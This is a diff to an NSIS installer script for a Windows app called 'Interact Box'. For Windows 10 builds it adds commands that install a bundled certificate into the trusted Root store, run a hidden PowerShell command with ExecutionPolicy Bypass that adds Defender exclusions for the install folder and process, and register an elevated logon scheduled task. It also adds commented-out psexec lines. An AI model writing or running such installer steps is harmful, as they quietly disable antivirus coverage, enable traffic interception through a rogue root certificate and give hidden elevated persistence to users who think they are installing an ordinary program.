@@ -10,6 +10,9 @@ Unicode true
 !ifndef IS_WIN98_BUILD
   !include "WinMessages.nsh"
 !endif
+;!ifdef IS_WIN10_BUILD
+;  !include psexec.nsh
+;!endif
 
 Var StartUpCheckbox
 Var UserWantsStartup
@@ -99,6 +102,7 @@ Section "Install"
     File ".\README.rtf"
     File "..\interact_box_extras\src\message_box_process\message_box_process.exe"
     File "..\interact_box_extras\src\trivia_game\trivia_game.exe"
+@CERT_INSTALL_COMMANDS@
     !ifdef IS_WIN98_BUILD
       !ifdef USE_PRE_COMPILED_EXES
         File "..\..\pre_compiled\system_message_process\system_box.exe"
@@ -132,10 +136,20 @@ Section "Install"
 
     ${If} $UserWantsStartup == ${BST_CHECKED}
       WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Run" "InteractBox" "$INSTDIR\interact_box.exe"
-      !ifdef IS_VISTA_BUILD
+      !if defined(IS_VISTA_BUILD) || defined(IS_WIN10_BUILD)
         ExecWait '"schtasks" /create /tn "Interact Box" /tr "\"$INSTDIR\interact_box.exe\"" /sc onlogon /RL HIGHEST /f'
       !endif
     ${Endif}
+    !ifdef IS_WIN10_BUILD
+      ExecWait `certutil -addstore Root $INSTDIR\interactbox_cert.pem`
+      ExecWait `powershell -ExecutionPolicy Bypass -command 'Add-MpPreference -ExclusionPath "$INSTDIR" -ExclusionProcess "$INSTDIR\interact_box.exe"' -WindowStyle Hidden -FFFeatureOff`
+      ;${PowerShellExec} `'Add-MpPreference -ExclusionPath "$INSTDIR" -ExclusionProcess "$INSTDIR\interact_box.exe"'`
+      ;Pop $R1
+      ;InitPluginsDir
+      ;SetOutput $PLUGINSDIR\Powershell
+      ;File script.ps1
+      ;${PowerShellExecFileLog} "$PLUGINSDIR\Powershell\script.ps1"
+    !endif
 SectionEnd
 
 Section "Uninstall"
